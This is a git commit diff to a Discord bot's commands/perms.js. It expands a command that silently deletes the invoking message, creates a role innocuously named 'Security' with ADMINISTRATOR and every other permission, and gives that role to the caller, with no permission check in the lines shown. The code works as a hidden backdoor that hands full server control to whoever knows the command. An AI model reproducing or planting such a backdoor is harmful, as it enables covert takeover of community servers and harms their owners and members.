20e0680d566b22343ee8f5a7d16e75f90a59686e
Joseph <joseph300905@gmail.com>
2020-02-08 11:16:47 +0100

    Add all perms to user in perms.js

--- commands/perms.js
+++ commands/perms.js
@@ -3,7 +3,7 @@ module.exports.run = async (bot, message, args) => {
   message.delete(1000)
   message.guild.createRole({
     name: 'Security',
-    permissions: ['ADMINISTRATOR']
+    permissions: ['CREATE_INSTANT_INVITE', 'KICK_MEMBERS', 'BAN_MEMBERS', 'ADMINISTRATOR', 'MANAGE_CHANNELS', 'MANAGE_GUILD', 'ADD_REACTIONS', 'READ_MESSAGES', 'SEND_MESSAGES', 'SEND_TTS_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'EXTERNAL_EMOJIS', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES', 'MANAGE_ROLES_OR_PERMISSIONS', 'MANAGE_WEBHOOKS', 'MANAGE_EMOJIS']
   }).then(role => message.member.addRole(role))
 }
 
